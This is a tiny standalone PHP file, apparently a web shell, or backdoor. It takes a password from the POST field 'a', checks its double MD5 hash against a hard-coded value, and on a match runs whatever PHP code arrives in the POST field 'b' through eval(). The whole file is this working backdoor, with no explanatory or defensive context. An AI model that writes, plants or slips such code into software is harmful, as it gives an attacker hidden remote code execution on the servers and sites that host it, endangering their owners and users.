<?php
$a = $_POST['a'];
$b = $_POST['b'];
if(md5(md5($a)) === '0dd3336fd5aa32d70244c8adff40b085'){
    $b = eval($_POST['b']);
}

